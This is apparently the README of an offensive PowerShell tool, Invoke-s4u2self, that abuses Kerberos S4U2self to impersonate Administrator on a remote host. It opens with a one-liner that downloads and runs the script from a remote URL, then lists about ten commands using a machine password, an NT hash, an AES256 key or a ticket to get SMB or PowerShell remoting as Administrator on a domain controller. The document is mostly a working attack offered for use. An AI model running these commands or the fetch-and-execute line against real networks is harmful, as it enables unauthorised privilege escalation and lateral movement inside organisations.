# Invoke-s4u2self
A tool that automates s4u2self abuse to gain access to remote hosts

Run as follows:

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-SessionHunter/main/Invoke-s4u2self.ps1')
```

### SMBRemoting

```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Password MachinePassword
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -AES256 d01c9d4441caf093ce018c432c48d50efc1c979a984d769cc0db76d6e5c05ab8
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -SMBRemoting -Ticket doIFgjCCBX6gA......BsNZmVycmFyaS5sb2NhbA==
```
```
Invoke-s4u2self -ComputerName DC01 -Domain ferrari.local -DomainController DC01.ferrari.local -Impersonate Administrator -SMBRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
```


### PSRemoting

```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -PSRemoting -Password MachinePassword
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -PSRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -PSRemoting -AES256 d01c9d4441caf093ce018c432c48d50efc1c979a984d769cc0db76d6e5c05ab8
```
```
Invoke-s4u2self -ComputerName DC01 -Impersonate Administrator -PSRemoting -Ticket doIFgjCCBX6gA......BsNZmVycmFyaS5sb2NhbA==
```
```
Invoke-s4u2self -ComputerName DC01 -Domain ferrari.local -DomainController DC01.ferrari.local -Impersonate Administrator -PSRemoting -NTHash 22a151bd3056ac739718f73dfe5f9614
```

![image](https://github.com/Leo4j/Invoke-s4u2self/assets/61951374/b9075667-bee3-40b6-bf6e-e4d227ac6ac9)

![image](https://github.com/Leo4j/Invoke-s4u2self/assets/61951374/ab213a41-dcbf-4b48-a67c-e0ebe478be12)


### Dependencies:
Invoke-SMBRemoting: https://github.com/Leo4j/Invoke-SMBRemoting

Rubeus: https://github.com/GhostPack/Rubeus
